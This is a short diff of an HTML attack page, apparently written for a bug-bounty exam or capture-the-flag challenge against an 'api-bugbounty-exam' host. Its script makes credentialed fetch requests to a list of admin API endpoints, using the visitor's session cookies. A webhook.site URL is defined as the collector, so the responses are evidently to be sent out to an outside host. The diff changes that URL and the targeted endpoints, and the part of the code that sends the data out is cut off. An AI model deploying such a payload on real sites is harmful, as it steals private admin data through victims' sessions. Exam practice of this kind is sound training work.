@@ -2,18 +2,17 @@
 <html>
 <body>
     <script>
-        const webh = "https://webhook.site/6b0b4772-6bdc-417e-a83a-2403f5690ef1";
+        const webh = "https://webhook.site/966eca5b-8dbd-405f-895e-a47c742aa523";
         const base = "https://api-bugbounty-exam.hashacademy.co";
 
-        const targets = [
-            "/api/admin/messages",              // List all messages (High Probability)
-            "/api/admin/contact/messages",      // Variation of the list
-            "/api/admin/system/env",            // Look for HASH{...} in env vars
-            "/api/admin/logs",                  // Standard admin logs
-            "/api/admin/me"                     // Alternative profile path
+        const endpoints = [
+            "/api/admin/bookings",
+            "/api/admin/rentals",
+            "/api/admin/rentals/stats",
+            "/api/admin/cars/stats"
         ];
 
-        targets.forEach(path => {
+        endpoints.forEach(path => {
             fetch(base + path, { credentials: "include" })
                 .then(r => r.text())
                 .then(data => {
